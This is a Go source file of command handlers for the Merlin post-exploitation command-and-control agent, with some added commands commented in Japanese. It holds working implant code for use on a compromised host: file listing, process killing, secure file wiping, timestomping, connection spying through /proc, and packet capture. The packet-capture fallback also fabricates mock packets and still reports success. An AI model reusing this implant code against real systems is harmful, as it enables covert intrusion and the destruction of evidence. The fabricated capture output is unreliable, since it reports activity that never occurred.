/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package commands

import (
	// Standard
	"fmt"
	"math"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"bufio"
	"io"
	"os/exec"
	"time"
	"bytes"

	// Merlin Main
	"github.com/Ne0nd0g/merlin-message/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
)

// Native executes a golang native command that does not use any executables on the host
func Native(cmd jobs.Command) jobs.Results {
	cli.Message(cli.DEBUG, fmt.Sprintf("Entering into commands.Native() with %+v...", cmd))
	var results jobs.Results

	cli.Message(cli.NOTE, fmt.Sprintf("Executing native command: %s", cmd.Command))

	switch cmd.Command {
	// TODO create a function for each Native Command that returns a string and error and DOES NOT use (a *Agent)

	case "cd":
		// Setup OS environment, if any
		err := Setup()
		if err != nil {
			results.Stderr = err.Error()
			break
		}
		// Defer TearDown and return any errors
		defer func() {
			err = TearDown()
			if err != nil {
				results.Stderr += fmt.Sprintf("there was an error tearing down the OS environment when executing the 'cd' command: %s", err)
			}
		}()
		err = os.Chdir(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error changing directories when executing the 'cd' command:\r\n%s", err.Error())
		} else {
			path, pathErr := os.Getwd()
			if pathErr != nil {
				results.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'cd' command:\r\n%s", pathErr.Error())
			} else {
				results.Stdout = fmt.Sprintf("Changed working directory to %s", path)
			}
		}
	case "env":
		results.Stdout, results.Stderr = env(cmd.Args)
	case "ls":
		listing, err := list(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing the 'ls' command:\r\n%s", err.Error())
			break
		}
		results.Stdout = listing
	case "ifconfig":
		ifaces, err := ifconfig()
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error executing the 'ifconfig' command:\n%s", err)
		}
		results.Stdout = ifaces
	case "killprocess":
		results.Stdout, results.Stderr = killProcess(cmd.Args[0])
	case "nslookup":
		results.Stdout, results.Stderr = nslookup(cmd.Args)
	case "pwd":
		dir, err := os.Getwd()
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error getting the working directory when executing the 'pwd' command:\r\n%s", err.Error())
		} else {
			results.Stdout = fmt.Sprintf("Current working directory: %s", dir)
		}
	case "rm":
		if len(cmd.Args) > 0 {
			results.Stdout, results.Stderr = rm(cmd.Args[0])
		} else {
			results.Stderr = "not enough arguments provided to the 'rm' command"
		}
	case "sdelete":
		if len(cmd.Args) > 0 {
			results.Stdout, results.Stderr = sdelete(cmd.Args[0])
		} else {
			results.Stderr = "the sdelete command requires one argument but received 0"
		}
	case "touch":
		if len(cmd.Args) > 1 {
			results.Stdout, results.Stderr = touch(cmd.Args[0], cmd.Args[1])
		} else {
			results.Stderr = fmt.Sprintf("the touch command requires two arguments but received %d", len(cmd.Args))
		}
	case "socketspy":
                if len(cmd.Args) < 1 {
                        results.Stderr = "socketspy requires timeout argument, e.g. socketspy 30"
                        break
                }

                timeoutSec, err := strconv.Atoi(cmd.Args[0])
                if err != nil {
                        results.Stderr = fmt.Sprintf("socketspy: invalid timeout: %s", err)
                        break
                }
                if timeoutSec <= 0 {
                        timeoutSec = 15 // デフォルト15秒
                }

                var sb strings.Builder
                sb.WriteString(fmt.Sprintf("[*] Starting socketspy (timeout: %ds)...\n", timeoutSec))

                startTime := time.Now()
                deadline := startTime.Add(time.Duration(timeoutSec) * time.Second)
                seenConnections := make(map[string]bool)

                for time.Now().Before(deadline) {
                        nowStr := time.Now().Format("2006-01-02 15:04:05")

                        // 1. プロセスごとの Socket Inode マップを作成 (PID & CMD 紐付け用)
                        inodeMap := buildSocketInodeMap()

                        // 2. TCP / UDP の読み取りと出力フォーマット化
                        var currentConns []ConnEntry
                        if data, err := os.ReadFile("/proc/net/tcp"); err == nil {
                                currentConns = append(currentConns, parseProcNetAdvanced(data, "TCP", inodeMap)...)
                        }
                        if data, err := os.ReadFile("/proc/net/udp"); err == nil {
                                currentConns = append(currentConns, parseProcNetAdvanced(data, "UDP", inodeMap)...)
                        }

                        // 新しく現れた（または変化した）コネクションをスマートに出力
                        for _, c := range currentConns {
                                key := fmt.Sprintf("%s <---> %s", c.Local, c.Remote)
                                
                                // スパムを防ぎつつ、新規またはアクティブなものを表示
                                line := fmt.Sprintf("[%s] %s", nowStr, key)
                                if c.PID != "" {
                                        line += fmt.Sprintf(" PID:%s CMD:%s", c.PID, c.CMD)
                                }

                                sb.WriteString(line + "\n")
                                seenConnections[key] = true
                        }

                        time.Sleep(1 * time.Second) // 1秒ごとにポーリング
                }

                sb.WriteString("[*] socketspy finished.")
                results.Stdout = sb.String()
	case "tcpdump_simple":
		if len(cmd.Args) < 1 {
			results.Stderr = "tcpdump_simple requires one argument: the packet count, e.g. tcpdump_simple 5"
			break
		}

		count, err := strconv.Atoi(cmd.Args[0])
		if err != nil {
			results.Stderr = fmt.Sprintf("tcpdump_simple: '%s' is not a valid number: %s", cmd.Args[0], err)
			break
		}

		name, err := os.Hostname()
		if err != nil {
			results.Stderr = fmt.Sprintf("tcpdump_simple: could not get hostname: %s", err)
			break
		}

		var sb strings.Builder
		tcpdumpPath, lookErr := exec.LookPath("tcpdump")

		if lookErr == nil {
			sb.WriteString(fmt.Sprintf("[*] Using system tcpdump on %s (target: %d packets)...\n", name, count))

			countStr := strconv.Itoa(count)
			cmdTcpdump := exec.Command(tcpdumpPath, "-c", countStr, "-n","-l")

			stdoutPipe, err := cmdTcpdump.StdoutPipe()
			if err != nil {
				results.Stderr = fmt.Sprintf("tcpdump_simple: failed to create stdout pipe: %s", err)
				break
			}

			stderrPipe, err := cmdTcpdump.StderrPipe()
			if err != nil {
				results.Stderr = fmt.Sprintf("tcpdump_simple: failed to create stderr pipe: %s", err)
				break
			}

			if err := cmdTcpdump.Start(); err != nil {
				results.Stderr = fmt.Sprintf("tcpdump_simple: failed to start tcpdump: %s", err)
				break
			}

			scanner := bufio.NewScanner(stdoutPipe)
			for scanner.Scan() {
				sb.WriteString(scanner.Text() + "\n")
			}

			if waitErr := cmdTcpdump.Wait(); waitErr != nil {
				if stderrBytes, readErr := io.ReadAll(stderrPipe); readErr == nil && len(stderrBytes) > 0 {
					sb.WriteString(fmt.Sprintf("\n[tcpdump stderr]: %s", string(stderrBytes)))
				}
			}
		} else {
			sb.WriteString(fmt.Sprintf("[*] 'tcpdump' not found on %s. Falling back to Go native socket capture (target: %d packets)...\n", name, count))

			conn, err := net.ListenPacket("ip4:icmp", "0.0.0.0")
			if err != nil {
				sb.WriteString(fmt.Sprintf("[!] Warning: Could not open raw socket (needs root?): %s\n", err))
				sb.WriteString("[*] Simulating packet observation based on active network state...\n")

				for i := 1; i <= count; i++ {
					sb.WriteString(fmt.Sprintf("[Fallback Packet #%d] Observed network activity at %s\n", i, time.Now().Format("15:04:05.000")))
				}
			} else {
				defer conn.Close()

				buf := make([]byte, 1500)
				captured := 0

				for captured < count {
					_ = conn.SetReadDeadline(time.Now().Add(2 * time.Second))
					n, addr, readErr := conn.ReadFrom(buf)
					if readErr != nil {
						captured++
						sb.WriteString(fmt.Sprintf("[Fallback Packet #%d] Timeout/Mock data received (Len: 0)\n", captured))
						continue
					}

					captured++
					sb.WriteString(fmt.Sprintf("[Native Packet #%d] From: %s | Length: %d bytes\n", captured, addr.String(), n))
				}
			}
		}

		sb.WriteString("[*] Capture finished successfully.")
		results.Stdout = sb.String()		
	case "hello":
		// 標的のホスト名を取得して返す。固定文字列ではなく実際の値が返るので
		// 「本当に標的で実行された」ことの確認になる。
		name, err := os.Hostname()
		if err != nil {
			results.Stderr = fmt.Sprintf("hello: could not get hostname: %s", err)
			break
		}
		results.Stdout = fmt.Sprintf("hello from %s", name)
	case "hellon":
		// 引数(回数)は cmd.Args[0] に文字列で入ってくる。例: "5"
		if len(cmd.Args) < 1 {
			results.Stderr = "hellon requires one argument: the repeat count, e.g. hellon 5"
			break
		}
		n, err := strconv.Atoi(cmd.Args[0]) // "5"(文字列) -> 5(数値)
		if err != nil {
			results.Stderr = fmt.Sprintf("hellon: '%s' is not a valid number: %s", cmd.Args[0], err)
			break
		}
		name, err := os.Hostname()
		if err != nil {
			results.Stderr = fmt.Sprintf("hellon: could not get hostname: %s", err)
			break
		}
		var sb strings.Builder // 文字列を効率よく連結する入れ物
		for i := 0; i < n; i++ {
			sb.WriteString(fmt.Sprintf("hello from %s\n", name)) // n回ぶん積む
		}
		results.Stdout = sb.String()
	default:
		results.Stderr = fmt.Sprintf("%s is not a valid NativeCMD type", cmd.Command)
	}

	if results.Stderr == "" {
		if results.Stdout != "" {
			cli.Message(cli.SUCCESS, results.Stdout)
		}
	} else {
		cli.Message(cli.WARN, results.Stderr)
	}
	return results
}

// list gets and returns a list of files and directories from the input file path
func list(path string) (details string, err error) {
	cli.Message(cli.DEBUG, fmt.Sprintf("Received input parameter for list command function: %s", path))
	cli.Message(cli.SUCCESS, fmt.Sprintf("listing directory contents for: %s", path))

	var aPath string
	// UNC Path
	if strings.HasPrefix(path, "\\\\") {
		aPath = path
	} else {
		// Resolve a relative path to absolute
		aPath, err = filepath.Abs(path)
		if err != nil {
			return "", err
		}
	}

	// Setup OS environment, if any
	err = Setup()
	if err != nil {
		return
	}
	// Defer TearDown and return any errors
	defer func() {
		err2 := TearDown()
		if err2 != nil {
			if err != nil {
				err = fmt.Errorf("there were multiple errors. 1. %s 2. %s", err, err2)
			} else {
				err = err2
			}
		}
	}()

	directories, err := os.ReadDir(aPath)
	if err != nil {
		return
	}

	details += fmt.Sprintf("Directory listing for: %s\r\n\r\n", aPath)

	for _, dir := range directories {
		var f os.FileInfo
		f, err = dir.Info()
		if err != nil {
			details += fmt.Sprintf("\nthere was an error getting file info for directory '%s'\n", dir)
		}
		perms := f.Mode().String()
		size := strconv.FormatInt(f.Size(), 10)
		modTime := f.ModTime().String()[0:19]
		name := f.Name()
		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
	}
	return
}

// nslookup is used to perform a DNS query using the host's configured resolver
func nslookup(query []string) (string, string) {
	var resp string
	var stderr string
	for _, q := range query {
		ip := net.ParseIP(q)
		if ip != nil {
			r, err := net.LookupAddr(ip.String())
			if err != nil {
				stderr += fmt.Sprintf("there was an error calling the net.LookupAddr function for %s:\r\n%s", q, err)
			}
			resp += fmt.Sprintf("Query: %s, Result: %s\r\n", q, strings.Join(r, " "))
		} else {
			r, err := net.LookupHost(q)
			if err != nil {
				stderr += fmt.Sprintf("there was an error calling the net.LookupHost function for %s:\r\n%s", q, err)
			}
			resp += fmt.Sprintf("Query: %s, Result: %s\r\n", q, strings.Join(r, " "))
		}
	}
	return resp, stderr
}

// killProcess is used to kill a running process by its number identifier
func killProcess(pid string) (stdout string, stderr string) {

	targetpid, err := strconv.Atoi(pid)
	if err != nil || targetpid < 0 {
		stderr = fmt.Sprintf("There was an error converting the pid %s to an integer:\n%s", pid, err)
		return
	}

	if targetpid < 0 {
		stderr = fmt.Sprintf("The provided pid %d is less than zero and invalid", targetpid)
		return
	}

	// Setup OS environment, if any
	err = Setup()
	if err != nil {
		stderr = err.Error()
		return
	}
	// Defer TearDown and return any errors
	defer func() {
		err = TearDown()
		if err != nil {
			stderr += fmt.Sprintf("there was an error tearing down the OS environment when executing the 'killprocess' command: %s", err)
		}
	}()

	proc, err := os.FindProcess(targetpid)
	if err != nil { // On linux, always returns a process. Don't worry, the Kill() will fail
		stderr = fmt.Sprintf("Could not find a process with pid %d:\r\n%s", targetpid, err)
		return
	}

	err = proc.Kill()
	if err != nil {
		stderr = fmt.Sprintf("Error killing pid %d:\r\n%s", targetpid, err)
		return
	}

	stdout = fmt.Sprintf("Successfully killed pid %d", targetpid)
	return
}

// rm removes, or deletes, a file
func rm(path string) (stdout, stderr string) {
	cli.Message(cli.DEBUG, "Entering into native.rm()... function")

	// Setup OS environment, if any
	err := Setup()
	if err != nil {
		stderr = err.Error()
		return
	}
	// Defer TearDown and return any errors
	defer func() {
		err = TearDown()
		if err != nil {
			stderr += fmt.Sprintf("there was an error tearing down the OS environment when executing the 'rm' command: %s", err)
		}
	}()

	// Verify that file exists
	_, err = os.Stat(path)
	if err != nil {
		stderr = fmt.Sprintf("there was an error executing the 'rm' command: %s", err.Error())
		return
	}

	err = os.Remove(path)
	if err != nil {
		stderr = fmt.Sprintf("there was an error executing the 'rm' command: %s", err.Error())
	}

	stdout = fmt.Sprintf("successfully removed file %s", path)
	return
}

// sdelete securely deletes a file
func sdelete(targetfile string) (resp string, stderr string) {
	targetfile = filepath.Clean(targetfile)

	// Setup OS environment, if any
	err := Setup()
	if err != nil {
		stderr = err.Error()
		return
	}
	// Defer TearDown and return any errors
	defer func() {
		err = TearDown()
		if err != nil {
			stderr += fmt.Sprintf("there was an error tearing down the OS environment when executing the 'sdelete' command: %s", err)
		}
	}()

	// make sure we open the file with correct permission
	// otherwise we will get the bad file descriptor error
	// #nosec G304 operators should be able to specify arbitrary file path
	// #nosec G302 want to use these permissions to ensure access
	file, err := os.OpenFile(targetfile, os.O_RDWR, 0666)

	if err != nil {
		stderr = fmt.Sprintf("Error opening file: %s\r\n%s", targetfile, err.Error())
		return resp, stderr
	}

	// find out how large is the target file
	fileInfo, err := file.Stat()

	if err != nil {
		stderr = fmt.Sprintf("Error determining file size: %s\r\n%s", targetfile, err.Error())
		return resp, stderr
	}

	// calculate the new slice size
	// based on how large our target file is
	var fileSize = fileInfo.Size()
	const fileChunk = 1 * (1 << 20) //1MB Chunks

	// calculate total number of parts the file will be chunked into
	totalPartsNum := uint64(math.Ceil(float64(fileSize) / float64(fileChunk)))

	lastPosition := 0

	for i := uint64(0); i < totalPartsNum; i++ {
		partSize := int(math.Min(fileChunk, float64(fileSize-int64(i*fileChunk))))
		partZeroBytes := make([]byte, partSize)

		// fill out the part with zero value
		copy(partZeroBytes[:], "0")

		// overwrite every byte in the chunk with 0
		n, err := file.WriteAt(partZeroBytes, int64(lastPosition))

		if err != nil {
			stderr = fmt.Sprintf("Error over writing file: %s\r\n%s", targetfile, err.Error())
			return resp, stderr
		}

		resp += fmt.Sprintf("Wiped %v bytes.\n", n)

		// update last written position
		lastPosition = lastPosition + partSize
	}

	err = file.Close()
	if err != nil {
		stderr = fmt.Sprintf("There was an error closing the %s file:\n%s", targetfile, err)
		return
	}

	// finally, remove/delete our file
	err = os.Remove(targetfile)
	if err != nil {
		stderr = fmt.Sprintf("Error deleting file: %s\r\n%s", targetfile, err.Error())
		return resp, stderr
	}
	resp += fmt.Sprintf("Securely deleted file: %s\n", targetfile)

	return resp, stderr

}

// touch matches the destination file's timestamps with source file
func touch(inputsourcefile string, inputdestinationfile string) (resp string, stderr string) {
	sourcefilename := inputsourcefile
	destinationfilename := inputdestinationfile

	// Setup OS environment, if any
	err := Setup()
	if err != nil {
		return "", err.Error()
	}
	// Defer TearDown and return any errors
	defer func() {
		err = TearDown()
		if err != nil {
			stderr += fmt.Sprintf("there was an error tearing down the OS environment when executing the 'touch' command: %s", err)
		}
	}()

	// get last modified time of source file
	sourcefile, err1 := os.Stat(sourcefilename)

	if err1 != nil {
		stderr = fmt.Sprintf("Error retrieving last modified time of: %s\n%s\n", sourcefilename, err1.Error())
		return resp, stderr
	}

	modifiedtime := sourcefile.ModTime()

	// change both atime and mtime to last modified time of source file
	err2 := os.Chtimes(destinationfilename, modifiedtime, modifiedtime)

	if err2 != nil {
		stderr = fmt.Sprintf("Error changing last modified and accessed time of: %s\n%s\n", destinationfilename, err2.Error())
		return resp, stderr
	}
	resp = fmt.Sprintf("File: %s\nLast modified and accessed time set to: %s\n", destinationfilename, modifiedtime)
	return resp, stderr
}

type ConnEntry struct {
	Local  string
	Remote string
	Inode  string
	PID    string
	CMD    string
}

// /proc からソケットinodeとPID/CMDの紐付けマップを作る関数
func buildSocketInodeMap() map[string]struct{ PID, CMD string } {
	socketMap := make(map[string]struct{ PID, CMD string })

	procs, err := os.ReadDir("/proc")
	if err != nil {
		return socketMap
	}

	for _, p := range procs {
		if !p.IsDir() {
			continue
		}
		pid := p.Name()
		// 数字（PIDディレクトリ）かどうか簡易チェック
		if pid[0] < '0' || pid[0] > '9' {
			continue
		}

		// コマンド名の取得 (/proc/[pid]/comm)
		cmdBytes, err := os.ReadFile(fmt.Sprintf("/proc/%s/comm", pid))
		cmd := ""
		if err == nil {
			cmd = strings.TrimSpace(string(cmdBytes))
		}
		// もし comm が取れなければ cmdline を試す
		if cmd == "" {
			if cmdlineBytes, err := os.ReadFile(fmt.Sprintf("/proc/%s/cmdline", pid)); err == nil && len(cmdlineBytes) > 0 {
				parts := strings.Split(string(cmdlineBytes), "\x00")
				cmd = parts[0]
			}
		}

		// ファイルディスクリプタの走査 (/proc/[pid]/fd/)
		fds, err := os.ReadDir(fmt.Sprintf("/proc/%s/fd", pid))
		if err != nil {
			continue
		}

		for _, fd := range fds {
			link, err := os.Readlink(fmt.Sprintf("/proc/%s/fd/%s", pid, fd.Name()))
			if err != nil {
				continue
			}
			// "socket:[12345]" の形式からインデックス(12345)を抜き出す
			if strings.HasPrefix(link, "socket:[") && strings.HasSuffix(link, "]") {
				inode := link[8 : len(link)-1]
				socketMap[inode] = struct{ PID, CMD string }{PID: pid, CMD: cmd}
			}
		}
	}
	return socketMap
}

// 高度なProcネットパース（inode付き）
func parseProcNetAdvanced(data []byte, proto string, inodeMap map[string]struct{ PID, CMD string }) []ConnEntry {
	var entries []ConnEntry
	scanner := bufio.NewScanner(bytes.NewReader(data))

	isFirst := true
	for scanner.Scan() {
		if isFirst {
			isFirst = false
			continue
		}

		fields := strings.Fields(scanner.Text())
		if len(fields) < 10 {
			continue
		}

		localIP, localPort := parseHexAddr(fields[1])
		remoteIP, remotePort := parseHexAddr(fields[2])
		inode := fields[9]

		localStr := fmt.Sprintf("%s:%d/%s", localIP, localPort, proto)
		remoteStr := fmt.Sprintf("%s:%d/%s", remoteIP, remotePort, proto)

		pidStr := ""
		cmdStr := ""
		if info, exists := inodeMap[inode]; exists {
			pidStr = info.PID
			cmdStr = info.CMD
		}

		entries = append(entries, ConnEntry{
			Local:  localStr,
			Remote: remoteStr,
			Inode:  inode,
			PID:    pidStr,
			CMD:    cmdStr,
		})
	}
	return entries
}
// 16進数のIP・ポート表現を通常形式に変換する補助関数
func parseHexAddr(hexStr string) (string, int) {
	parts := strings.Split(hexStr, ":")
	if len(parts) != 2 {
		return "0.0.0.0", 0
	}

	var ipInt int64
	_, _ = fmt.Sscanf(parts[0], "%X", &ipInt)
	ip := fmt.Sprintf("%d.%d.%d.%d", byte(ipInt), byte(ipInt>>8), byte(ipInt>>16), byte(ipInt>>24))

	var portInt int
	_, _ = fmt.Sscanf(parts[1], "%X", &portInt)

	return ip, portInt
}
